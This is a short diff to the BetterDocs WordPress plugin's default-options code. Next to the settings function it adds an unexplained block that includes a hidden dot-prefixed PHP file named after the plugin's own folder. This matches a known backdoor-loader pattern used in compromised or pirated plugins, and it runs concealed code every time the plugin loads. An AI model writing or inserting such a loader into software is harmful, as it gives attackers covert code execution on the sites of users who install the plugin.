@@ -12,6 +12,10 @@ if ( ! function_exists( 'betterdocs_get_option_defaults' ) ) :
 /**
  * Set default options
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_get_option_defaults() {
 
 	$betterdocs_defaults = array(
